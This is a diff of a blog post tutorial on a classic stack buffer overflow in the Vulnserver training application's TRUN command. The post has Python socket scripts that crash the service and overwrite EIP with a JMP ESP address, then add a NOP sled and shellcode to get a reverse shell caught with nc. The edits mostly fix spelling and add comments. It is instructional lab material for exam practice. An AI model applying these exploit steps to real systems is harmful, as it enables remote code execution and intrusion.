@@ -3,13 +3,13 @@ layout: single
 title: Classic JMP ESP buffer overflow exploitation - remote overflow in Vulnserver
 ---
 
-This post covers the beginning of any exploit developers journey, the classic buffer overflow exploitation. 
+This post covers the beginning of any exploit developers' journey, the classic buffer overflow exploitation. 
 
 This post covers the exploitation of the Vulnererver TRUN command, utilizing a JMP ESP and EIP overwrite to obtain remote code execution on a system.
 
 ## Introduction - what is a buffer overflow?
 
-So what exactly is a buffer overflow vulnerability? A buffer overflow vulnerability is a software programming error that occurs commonly in C, and c++  applications when the software author uses insecure functions.  A buffer overflow vulnerability is where an input function is not validating the amount of user input that is given, which will allow a user to give too much the data that can then overwrite the buffer sized amount that is designated for the input, and start  writing data onto the stack.
+So what exactly is a buffer overflow vulnerability? A buffer overflow vulnerability is a software programming error that occurs commonly in C, and c++  applications when the software author uses insecure functions.  A buffer overflow vulnerability is where an input function is not validating the amount of user input that is given, which will allow a user to give too much the data that can then overwrite the buffer sized amount that is designated for the input, and start writing data onto the stack.
 
 The classic exploitation technique for a standard buffer overflow is to fill up the input buffer, and calculate exactly how much data you need to precisely place a JMP instruction within the EIP  memory register. The EIP memory register is responsible for pointing to the next address that is going to be executed, if the attacker can add a JMP instruction into this EIP register, they can have that JMP instruction point to a malicious payload, a malicious shellcode payload.
 
@@ -18,16 +18,16 @@ The classic exploitation technique for a standard buffer overflow is to fill up 
 While auditing the source code for this application, you can see that the TRUN  command takes user input using the insecure strncpy function, this allows for an attacker to abuse the applications buffer overflow vulnerability.
 
 ```c
-	} else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
-		char *TrunBuf = malloc(3000);
-		memset(TrunBuf, 0, 3000);
-		for (i = 5; i < RecvBufLen; i++) {
-			if ((char)RecvBuf[i] == '.') {
-				strncpy(TrunBuf, RecvBuf, 3000); // <------------	
-				Function3(TrunBuf);
-				break;
-			}
-		}
+    } else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
+        char *TrunBuf = malloc(3000);
+        memset(TrunBuf, 0, 3000);
+        for (i = 5; i < RecvBufLen; i++) {
+            if ((char)RecvBuf[i] == '.') {
+                strncpy(TrunBuf, RecvBuf, 3000); // <----------- vulnerable function!
+                Function3(TrunBuf);
+                break;
+            }
+        }
 ```
 
 ## Running vulnserver
@@ -36,7 +36,7 @@ Start running the vulnserver application, make sure your firewall is configured 
 
 ![vulnserver 1](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver1.png)
 
-First a basic nc connection to the victim machine on port 9999 shows that Vulnserver is actively running.
+First, a basic nc connection to the victim machine on port 9999 shows that Vulnserver is actively running.
 
 ![vulnserver 2](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver2.png)
 
@@ -46,7 +46,7 @@ Use Immunity debugger and attach the running vulnserver application to it, this 
 
 ## Crash the application with Python
 
-With the vulnserver application running on port 9999 on the victim host target, you can use a basic python socket connection in order to send data to this command.
+With the vulnserver application running on port 9999 on the victim host target, you can use a basic python socket connection to send data to this command.
 
 ```python
 import socket
@@ -54,9 +54,10 @@ import socket
 victim_host = "10.0.0.161"
 port = 9999
 
-payload = "A" * 4000
-buffer_exploit = "TRUN /.:/" + payload
+payload = "A" * 4000    # data to crash the application
+buffer_exploit = "TRUN /.:/" + payload # the command to community with our application
 
+# socket connection to the program's port
 expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 expl.connect((victim_host, port))
 expl.send(buffer_exploit)
@@ -75,14 +76,14 @@ If we can determine how big the buffer is, we can fill it up, and the next data 
 
 ## Calculate the input buffer size
 
-We can use the pattern_create tool from metasploit, this creates a unique pattern every few bytes, if we crash the program with this, we can see exactly where the EIP register has been overwritten.
+We can use the pattern_create tool from Metasploit, this creates a unique pattern every few bytes, if we crash the program with this, we can see exactly where the EIP register has been overwritten.
 
 ```
 └─▪ ./pattern_create.rb -l 4000
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6.........
 ```
 
-Send this unqiue string to the application instead of all A's
+Send this unique string to the application instead of all A's
 
 ![vulnserver 5](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver5.png)
 
@@ -102,8 +103,8 @@ import socket
 victim_host = "10.0.0.161"
 port = 9999
 
-payload = "A" * 2003
-payload += "B" * 4
+payload = "A" * 2003 # calculated buffer
+payload += "B" * 4   # control EIP with 4 B's , translated into 41 in hex
 
 buffer_exploit = "TRUN /.:/" + payload
 
@@ -124,7 +125,7 @@ Now when you re-send your exploit to the application, you can see the EIP regist
 
 ## JMP to our shellcode
 
-Now that we can control what address get's executed next, we want to find a JMP ESP instruction, which will allow us to jump to our payload (ESP register). 
+Now that we can control what address gets executed next, we want to find a JMP ESP instruction, which will allow us to jump to our payload (ESP register). 
 
 We can use the command `!mona jmp -r esp` to locate JMP ESP instructions in the application, if there is no JMP ESP, a CALL ESP instruction works just as well.
 
@@ -134,11 +135,11 @@ Now instead of 4 B's, we want to use one of the JMP ESP's addresses instead.
 
 ## Note about security mitigations
 
-This vulnerable application has been and has it's .DLLs compiled without ASLR (address space layout randomization) which would randomize addresses like the JMP ESPs we need to use, if ASLR is ever enabled, it make exploitation **MUCH** harder, but that is not in-scope for this tutorial.
+This vulnerable application has been and has it's .DLLs compiled without ASLR (address space layout randomization) which would randomize addresses like the JMP ESPs we need to use if ASLR is ever enabled, it make exploitation **MUCH** harder, but that is not in-scope for this tutorial.
 
-Note to developers : always compile with ASLR if you can! If makes the attackers job a lot harder.
+Note to developers: always compile with ASLR if you can! If makes the attacker's job a lot harder.
 
-We will use the first one that is listed, and since this is a memory address from the application, you need to reverse it, in little endian format. You can easily do this with the python struct module.
+We will use the first one that is listed, and since this is a memory address from the application, you need to reverse it, in little-endian format. You can easily do this with the python struct module.
 
 ```python
 import socket
@@ -146,9 +147,9 @@ import socket
 victim_host = "10.0.0.161"
 port = 9999
 
-payload = "A" * 2003
-payload += struct.pack("<L", 0x625011AF) 
-payload += "C" * 500
+payload = "A" * 2003  # calculated buffer size
+payload += struct.pack("<L", 0x625011AF) # JMP ESP address being converted into little endian format
+payload += "C" * 500  # padding to ensure a crash
 
 buffer_exploit = "TRUN /.:/" + payload
 
@@ -160,7 +161,7 @@ print("[x] Sent TRUN + malicious payload to the victim")
 print("[!] You may need to send it multiple times")
 expl.close()
 ```
-If you run your exploit now, you can see your JMP ESP gets loaded into the EIP register. Now all we need to do is add a NOPSLED after our JMP, a NOPSLED is comprised of the NOP instruction in assembly, denoted by it's 0x90 opcode. This will allow for a clean jump, where our JMP ESP will land in a NOPSLED and cleanly move down the execution chain to our shellcodes first address.
+If you run your exploit now, you can see your JMP ESP gets loaded into the EIP register. Now, all we need to do is add a NOPSLED after our JMP, a NOPSLED is comprised of the NOP instruction in assembly, denoted by its 0x90 opcode. This will allow for a clean jump, where our JMP ESP will land in a NOPSLED and cleanly move down the execution chain to our shellcode's first address.
 
 ## Generate shellcode
 
@@ -275,3 +276,11 @@ expl.close()
 We can catch our incoming reverse shell with nc on our host system.
 
 ![vulnserver 9](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver9.png)
+
+## Wrapup
+
+We can start by auditing the source code of the vulnserver application, and while debugging it, we can crash it, calculate the buffer size of the user input function, and the use a JMP ESP instruction to JMP into a NOPSLED which hits our shellcode payload, all of this hits triggers our reverse shell payload which we catch with a nc connection listening on our set up local port.
+
+This is great for the OSCP exam, don't be intimidated, but this is usually seen as the easiest and most trivial type of buffer overflow, if you enjoyed this exploitation journey, you may very well be developing a passion for exploit development, I encourage you to check out the next post in this series, and eventually... some of my new and utterly complex and extreme Windows exploits.
+
+Have a great day!
